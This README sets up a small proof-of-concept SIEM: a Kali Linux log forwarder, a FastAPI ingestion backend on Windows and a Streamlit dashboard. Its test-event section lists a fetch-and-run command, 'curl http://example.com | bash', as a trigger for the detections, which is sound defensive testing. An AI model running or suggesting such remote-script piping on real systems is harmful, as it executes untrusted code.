# SmallScale_SIEM
Logs are generated on a Linux endpoint, forwarded via a custom agent to a centralized SIEM backend, processed for security detections, and visualized in real time through a live dashboard.

# **Steps to Execute the SIEM PoC (Current State)**

This setup assumes:

* **Windows host** → SIEM backend + dashboard
* **Kali Linux VM** → Log forwarder (agent)

---

## **1. Prerequisites**

### **On Windows Host**

* Python **3.9+**
* VS Code
* Internet access (for pip packages)

### **On Kali Linux VM**

* Python 3
* systemd (default in Kali)
* Network connectivity to Windows host

---

## **2. Start the SIEM Backend (Windows)**

### 2.1 Activate Virtual Environment

```powershell
cd siem-product
venv\Scripts\activate
```

### 2.2 Start FastAPI Ingestion Server

```powershell
cd backend
uvicorn main:app --host 0.0.0.0 --port 8000
```

This starts the **central log ingestion API**

### 2.3 Verify Backend is Running

Open in browser:

```
http://localhost:8000/docs
```

If Swagger UI appears → backend is running correctly.

---

## **3. Configure Network Access**

### 3.1 Get Windows Host IP

```powershell
ipconfig
```

Note the IPv4 address (example: `192.168.1.20`)

### 3.2 Allow Inbound Port on Windows (One-time)

Run PowerShell as **Administrator**:

```powershell
netsh advfirewall firewall add rule name="SIEM Ingest" dir=in action=allow protocol=TCP localport=8000
```

---

## **4. Start the Log Forwarder (Kali Linux)**

### 4.1 Ensure Kali Network Mode

* VirtualBox Network: **Bridged Adapter**
* Kali and Windows must be on the same network

### 4.2 Run the Log Forwarder

```bash
sudo python3 forwarder.py <WINDOWS_IP> 8000 --protocol http
```

Example:

```bash
sudo python3 forwarder.py 192.168.1.20 8000 --protocol http
```

Logs from Kali systemd journal are now being forwarded to the SIEM backend.

---

## **5. Start the Dashboard (Windows)**

Open a **new terminal** (backend should keep running).

```powershell
cd dashboard
streamlit run dashboard.py
```

Open in browser:

```
http://localhost:8501
```

Real-time SIEM dashboard is now live.

---

## **6. Generate Test Events (Kali Linux)**

Run any of the following to simulate activity:

### SSH Brute Force / User Enumeration

```bash
ssh fakeuser@localhost
```

### Privilege Escalation

```bash
sudo ls
```

### Suspicious Command Execution

```bash
curl http://example.com | bash
```

### Service Event

```bash
sudo systemctl restart ssh
```

---

## **7. Verify Output (Dashboard)**

You should see:

* Live logs appearing in the log table
* Alerts generated automatically
* Event spike in **Events per Minute** graph
* Alert severity distribution updating in real time

---

## **8. Stop the System**

### Stop Dashboard

Press `Ctrl + C` in the Streamlit terminal

### Stop Backend

Press `Ctrl + C` in the FastAPI terminal

### Stop Forwarder

Press `Ctrl + C` in Kali terminal

---

## **9. Execution Summary (One-Line)**

> Logs are generated on a Linux endpoint, forwarded via a custom agent to a centralized SIEM backend, processed for security detections, and visualized in real time through a live dashboard.

---
## Credits

This project used log forwarder code from the following open-source project:

- https://github.com/Ahmed-Sobhi-Ali/Custom-SIEM-Pipeline-with-AI-Powered-Detection/blob/main/log_forwarder.py by @Ahmed Sobhi Ali  
  

